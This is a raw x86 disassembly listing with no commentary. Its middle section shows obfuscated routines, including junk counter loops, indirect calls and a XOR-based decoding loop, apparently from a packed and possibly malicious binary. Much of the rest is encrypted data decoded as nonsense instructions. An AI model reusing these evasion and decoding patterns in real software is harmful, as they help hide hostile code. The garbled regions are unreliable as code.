  4108e2:	repz cmp edx,edx
  4108e5:	cwde   
  4108e6:	call   0x5ac0e7f1
  4108eb:	sar    BYTE PTR [ebp-0x59],cl
  4108ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ef:	leave  
  4108f0:	dec    edi
  4108f2:	xor    BYTE PTR [ecx+0x3d],dh
  4108f5:	test   BYTE PTR [eax+0x32],ah
  4108f8:	adc    cl,BYTE PTR [esi-0x3c4c416]
  4108fe:	fld    st(6)
  410900:	and    eax,0xaec616fd
  410905:	test   eax,0x2c057b6f
  41090a:	pop    es
  41090b:	push   ds
  41090c:	pop    es
  41090d:	stc    
  41090e:	pop    eax
  41090f:	cmp    DWORD PTR [ebx+eax*8],ecx
  410912:	out    dx,al
  410913:	int3   
  410914:	inc    esi
  410915:	xchg   esi,eax
  410916:	adc    ecx,ebp
  410918:	in     eax,0xf7
  41091a:	jmp    0x5b458b64
  41091f:	sub    BYTE PTR [edi],0x8
  410922:	je     0x410965
  410924:	cli    
  410925:	cli    
  410926:	dec    ebp
  410927:	outs   dx,BYTE PTR ds:[esi]
  410928:	adc    al,0xb
  41092a:	mov    esi,fs
  41092c:	sbb    esi,ebp
  41092e:	pop    edi
  41092f:	in     al,0xc5
  410931:	ret    
  410932:	push   ss
  410933:	push   edx
  410934:	mov    edi,0xc5c40f1c
  410939:	xor    BYTE PTR [edx+0x75],ah
  41093c:	ss dec ebx
  41093e:	push   eax
  41093f:	cmp    DWORD PTR [ecx],ebx
  410941:	inc    eax
  410942:	jl     0x4108eb
  410944:	out    dx,al
  410945:	mov    dl,0x51
  410947:	imul   BYTE PTR [edx-0x55aae08]
  41094d:	pop    esp
  41094e:	xchg   ebx,eax
  41094f:	aam    0xd4
  410951:	gs aas 
  410953:	shl    cl,0x25
  410956:	mov    esp,DWORD PTR [ebx]
  410958:	js     0x4109c5
  41095a:	cdq    
  41095b:	xor    bl,bl
  41095d:	adc    eax,0x6ecd0393
  410962:	int    0xa2
  410964:	popf   
  410965:	sbb    al,0xf5
  410967:	pop    esi
  410968:	fdivr  QWORD PTR [ecx]
  41096a:	mov    eax,ds:0xf8804e52
  41096f:	add    dh,ah
  410971:	fwait
  410972:	imul   ecx,DWORD PTR [eax],0x2a
  410975:	arpl   bp,di
  410977:	cld    
  410978:	mov    esp,0xaa83411e
  41097d:	retf   0x8a70
  410980:	xchg   dx,ax
  410982:	sti    
  410983:	sub    al,0xfb
  410985:	xor    DWORD PTR [edi+0x2f],ebx
  410988:	add    esi,DWORD PTR [ecx]
  41098a:	sbb    dh,al
  41098c:	not    DWORD PTR [edx-0x652286a7]
  410992:	mov    ds:0x5a44594d,eax
  410997:	push   ecx
  410998:	sbb    DWORD PTR [edx-0x22],ebx
  41099b:	fwait
  41099c:	test   eax,0xa8106a5
  4109a1:	pop    esp
  4109a2:	dec    edx
  4109a3:	in     al,0xd9
  4109a5:	pop    es
  4109a6:	push   esp
  4109a7:	pop    ss
  4109a8:	dec    esi
  4109a9:	rcr    BYTE PTR [ebx+0x7302737],0xd8
  4109b0:	push   esi
  4109b1:	(bad)  
  4109b2:	xchg   esp,eax
  4109b3:	cdq    
  4109b4:	mov    ecx,0x3d927ebe
  4109b9:	mov    esp,0x6c3bb8e8
  4109be:	cld    
  4109bf:	ins    BYTE PTR es:[edi],dx
  4109c0:	cdq    
  4109c1:	xor    edi,0x454dd02d
  4109c7:	pop    ds
  4109c8:	dec    esi
  4109c9:	inc    ebx
  4109ca:	mov    edx,0x3aa949b7
  4109cf:	into   
  4109d0:	inc    ebp
  4109d1:	jno    0x410958
  4109d3:	ror    BYTE PTR [ecx],0xfa
  4109d6:	ins    DWORD PTR es:[edi],dx
  4109d7:	adc    eax,0xfca3b66
  4109dc:	test   DWORD PTR [ebp-0x24],ecx
  4109df:	(bad)  
  4109e0:	dec    DWORD PTR [ebx+0x4244350d]
  4109e6:	add    BYTE PTR [ebx+0x19889],cl
  4109ec:	add    BYTE PTR [ecx+0x21e901],cl
  4109f2:	add    BYTE PTR [eax],al
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x449e9d61],0xf3
  410fc4:	adc    ch,BYTE PTR [esi]
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x41101b
  410fce:	cmc    
  410fcf:	inc    ecx
  410fd0:	mov    dl,0x20
  410fd2:	push   edi
  410fd3:	in     al,dx
  410fd4:	sub    eax,0x70efa722
  410fd9:	xor    al,0xa
  410fdb:	mov    edi,0x9ebda23f
  410fe0:	mov    ebp,0x9e03263c
  410fe5:	out    0xc7,al
  410fe7:	jae    0x41103b
  410fe9:	stc    
  410fea:	push   ebx
  410feb:	in     eax,0x68
  410fed:	sbb    eax,0xd052824a
  410ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff3:	add    bh,0xa9
  410ff6:	mov    edx,0x6a201fdb
  410ffb:	fbld   TBYTE PTR [eax+0x22ba4bbf]
  411001:	and    DWORD PTR [ebx+ebx*1-0x66],ebp
  411005:	xlat   BYTE PTR ds:[ebx]
  411006:	mov    ah,0x75
  411008:	imul   edi,DWORD PTR [eax],0xffffffb7
  41100b:	imul   eax,DWORD PTR ds:0x6817cc3f,0x1
  411012:	dec    eax
  411013:	cli    
  411014:	sbb    al,ch
  411016:	jge    0x411051
  411018:	int    0x1f
  41101a:	add    dh,0xeb
  41101d:	ins    DWORD PTR es:[edi],dx
  41101e:	aam    0x4f
  411020:	aas    
  411021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411022:	dec    esi
  411023:	push   cs
  411024:	not    DWORD PTR [ecx+0x1617bbad]
  41102a:	pop    esi
  41102b:	shl    BYTE PTR es:[edx-0x4b0159],0x37
  411033:	and    bh,ch
  411035:	(bad)  
  411036:	push   ecx
  411037:	sbb    ebx,edi
  411039:	cmp    BYTE PTR [ebx-0x451a65e4],dh
  41103f:	cmp    bl,BYTE PTR [esi]
  411041:	sti    
  411042:	push   ds
  411043:	aaa    
  411044:	lea    edx,[eax-0x7d]
  411047:	jb     0x411020
  411049:	push   edi
  41104a:	or     DWORD PTR [ecx],ebx
  41104c:	gs jb  0x41100e
  41104f:	dec    esp
  411050:	pusha  
  411051:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411053:	sbb    al,0xdd
  411055:	in     eax,dx
  411056:	add    ch,BYTE PTR [esi-0x77]
  411059:	jmp    0x41101e
  41105b:	cmp    eax,ebp
  41105d:	push   ebx
  41105e:	sti    
  41105f:	test   DWORD PTR [ecx+0x53],0xf0d5888
  411066:	lock xchg esp,eax
  411068:	loop   0x411043
  41106a:	push   eax
  41106b:	xchg   ecx,eax
  41106c:	xor    BYTE PTR [eax-0x519c2889],0x17
  411073:	xchg   bh,dh
  411075:	scas   al,BYTE PTR es:[edi]
  411076:	in     al,dx
  411077:	push   ebx
  411078:	add    BYTE PTR [ebp+0x267f4b19],0x44
  41107f:	je     0x411053
  411081:	push   ds
  411082:	cmp    BYTE PTR [esp+edi*1+0x6254cbdf],cl
  411089:	into   
  41108a:	sbb    cl,BYTE PTR [eax+0x4235ceea]
  411090:	stc    
  411091:	xchg   DWORD PTR [ecx],eax
  411093:	repz jno 0x4110a9
  411096:	push   edx
  411097:	mov    esi,0x5bc1310c
  41109c:	push   ebx
  41109d:	(bad)  
  41109e:	loope  0x41109a
  4110a0:	jmp    DWORD PTR [ebp+0x49]
  4110a3:	loope  0x41109a
  4110a5:	out    dx,al
  4110a6:	cmp    ebx,edx
  4110a8:	das    
  4110a9:	add    esp,DWORD PTR [edi-0xf60e630]
  4110af:	(bad)  
  4110b0:	ret    0xabf3
  4110b3:	sbb    BYTE PTR [esi-0x5b],bh
  4110b6:	sahf   
  4110b7:	inc    DWORD PTR [edi]
  4110b9:	push   ds
  4110ba:	sub    BYTE PTR [eax],0x98
  4110bd:	cmp    DWORD PTR [ecx-0x2c59ae6d],edi
  4110c3:	mov    esi,0xb2c2a8a1
  4110c8:	mov    dh,0x34
  4110ca:	rol    bl,1
  4110cc:	and    eax,0x5d6fb110
  4110d1:	mov    ebx,0xc0d449fe
  4110d6:	(bad)  
  4110d8:	ja     0x4110ac
  4110da:	xchg   ebp,eax
  4110db:	jae    0x41112b
  4110dd:	mov    edx,gs
  4110df:	xchg   ebx,eax
  4110e0:	jo     0x411138
  4110e2:	aaa    
  4110e3:	pop    esi
  4110e4:	aam    0xc8
  4110e6:	jmp    0x7d71:0xdbd177fd
  4110ed:	repz rol BYTE PTR [edi+ebx*1+0x6229c6f4],1
  4110f5:	(bad)  
  4110f6:	(bad)  [edi]
  4110f8:	inc    ebp
  4110f9:	mov    dl,0xf6
  4110fb:	fbstp  TBYTE PTR ds:0x1ea10179
  411101:	aas    
  411102:	adc    BYTE PTR [edi-0x3],cl
  411105:	or     eax,0xa5f6a735
  41110a:	mov    esp,0x4f11cd1b
  41110f:	push   esp
  411110:	shr    BYTE PTR [ebp+0x18c6b1c4],1
  411116:	(bad)  
  411117:	xor    esi,DWORD PTR [ebp+0x38]
  41111a:	out    0x3c,al
  41111c:	sahf   
  41111d:	sub    esp,edi
  41111f:	xchg   DWORD PTR [eax-0x31],ebx
  411122:	sbb    DWORD PTR [edi+0x2d],eax
  411125:	or     eax,0x42db2b42
  41112a:	adc    DWORD PTR [ebx],0xbb6b5f4a
  411130:	jno    0x4110e8
  411132:	mov    ebp,0x31750d4a
  411137:	je     0x411134
  411139:	cmp    al,0x32
  41113b:	or     al,0x55
  41113d:	in     eax,dx
  41113e:	xchg   ebx,eax
  41113f:	icebp  
  411140:	xor    BYTE PTR [edi],dh
  411142:	js     0x4110fe
  411144:	adc    cl,ah
  411146:	pop    esp
  411147:	mov    ebx,0x8f5a49f2
  41114c:	sub    BYTE PTR [ecx+0x71],ch
  41114f:	daa    
  411150:	and    DWORD PTR [ebp+edx*4+0x14149798],0x2b
  411158:	mov    es,WORD PTR [edi-0x5]
  41115b:	adc    al,0xf7
  41115d:	sub    al,0x68
  41115f:	scas   eax,DWORD PTR es:[edi]
  411160:	push   eax
  411161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411162:	jne    0x411128
  411164:	mov    DWORD PTR [eax],edi
  411166:	and    BYTE PTR [ebx+0xc66d1],dh
  41116c:	jle    0x411187
  41116e:	jo     0x4111d7
  411170:	jmp    0xe0d3996b
  411175:	call   0x2c9283c5
  41117a:	cmp    DWORD PTR [esi+ecx*2],ebp
  41117d:	mov    esp,0x42237e4b
  411182:	out    dx,al
  411183:	mov    WORD PTR [esi-0x4f],?
  411186:	retf   
  411187:	loope  0x411178
  411189:	cmovl  ebx,DWORD PTR [edi+0x3c56fdbe]
  411190:	test   al,0x99
  411192:	add    ebp,ecx
  411194:	inc    edi
  411195:	mov    edi,0xd5592613
  41119a:	mov    gs,ebp
  41119c:	push   ds
  41119d:	inc    ebx
  41119e:	jbe    0x4111a2
  4111a0:	mov    eax,0x6ff2402d
  4111a5:	neg    DWORD PTR [ebx]
  4111a7:	sar    cl,1
  4111a9:	mov    al,0x69
  4111ab:	cli    
  4111ac:	fimul  DWORD PTR [edi]
  4111ae:	or     al,0x27
  4111b0:	jmp    0x411187
  4111b2:	mov    dh,0x8d
  4111b4:	fsubr  QWORD PTR cs:[ebx-0x6c]
  4111b8:	fst    QWORD PTR [edi+0x7db7caed]
  4111be:	dec    eax
  4111bf:	inc    eax
  4111c0:	ficom  DWORD PTR [bp+si-0x71]
  4111c4:	adc    DWORD PTR [edi-0x41],eax
  4111c7:	stos   DWORD PTR es:[edi],eax
  4111c8:	outs   dx,BYTE PTR ds:[esi]
  4111c9:	jo     0x41116f
  4111cb:	ror    cl,1
  4111cd:	push   0xd5b56ab1
  4111d2:	dec    ecx
  4111d3:	out    dx,al
  4111d4:	xchg   esp,eax
  4111d5:	fld    DWORD PTR [esi]
  4111d7:	push   ss
  4111d8:	inc    ebp
  4111d9:	and    al,0x51
  4111db:	je     0x4111e5
  4111dd:	xchg   ebp,eax
  4111de:	gs mov al,0xd9
  4111e1:	mov    dl,0xce
  4111e3:	pop    es
  4111e4:	xor    edi,DWORD PTR [edi]
  4111e6:	(bad)  
  4111e8:	jne    0x411201
  4111ea:	out    dx,eax
  4111eb:	ja     0x41124c
  4111ed:	vpackssdw xmm2,xmm6,XMMWORD PTR [esi]
  4111f1:	push   esp
  4111f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f3:	push   ecx
  4111f4:	adc    DWORD PTR [ecx-0x31],0x53423c8b
  4111fb:	cmp    eax,DWORD PTR [esi-0x70]
  4111fe:	pop    esp
  4111ff:	outs   dx,BYTE PTR ds:[esi]
  411200:	push   0x2d591715
  411205:	xor    edx,DWORD PTR [esi-0x3d446616]
  41120b:	shl    DWORD PTR [esi-0x346aa009],1
  411211:	mov    esp,0x3f5e817b
  411216:	dec    edi
  411217:	mov    edi,0x835fa0cf
  41121c:	je     0x41127e
  41121e:	call   FWORD PTR [edi+edi*2]
  411221:	adc    al,BYTE PTR [edi+0x68]
  411224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411225:	jecxz  0x41123f
  411227:	xor    dh,ah
  411229:	and    esi,DWORD PTR [eax]
  41122b:	out    dx,al
  41122c:	std    
  41122d:	sbb    eax,ebx
  41122f:	jae    0x4111c0
  411231:	rol    BYTE PTR [ebx+0xf353c09],0x1c
  411238:	loopne 0x4111c7
  41123a:	not    BYTE PTR [esi+eiz*2]
  41123d:	mov    eax,ds:0x283a30d2
  411242:	cld    
  411243:	(bad)  
  411244:	mov    esp,0xded0c8f0
  411249:	ja     0x411269
  41124b:	ret    
  41124c:	add    dl,dl
  41124e:	fcmovbe st,st(7)
  411250:	cmp    BYTE PTR [ecx],cl
  411252:	pop    edx
  411253:	and    bh,BYTE PTR [esi+0x1c37850a]
  411259:	sar    DWORD PTR [esi+eax*4-0x7263ac76],1
  411260:	and    eax,0xe4852228
  411265:	and    al,0x5d
  411267:	cmp    cl,BYTE PTR [ebx+0x26]
  41126a:	popa   
  41126b:	repz ret 
  41126d:	out    dx,al
  41126e:	aaa    
  41126f:	loopne 0x411298
  411271:	and    esp,ebp
  411273:	mov    edx,0xd6fb75ab
  411278:	pop    ecx
  411279:	mov    ebx,0x876c8843
  41127e:	cmp    edi,ebp
  411280:	fisub  WORD PTR [ecx+0x2f]
  411283:	cli    
  411284:	leave  
  411285:	movd   mm6,DWORD PTR [ecx+0x64116b0b]
  41128c:	stos   BYTE PTR es:[edi],al
  41128d:	jne    0x41126b
  41128f:	pop    esi
  411290:	dec    esi
  411291:	or     eax,0xb40738a
  411296:	jl     0x411311
  411298:	shr    DWORD PTR [eax+0x69],0xf5
  41129c:	aaa    
  41129d:	xchg   ecx,eax
  41129e:	push   esi
  41129f:	les    edi,FWORD PTR [ebx-0x1b05b803]
  4112a5:	int3   
  4112a6:	push   edi
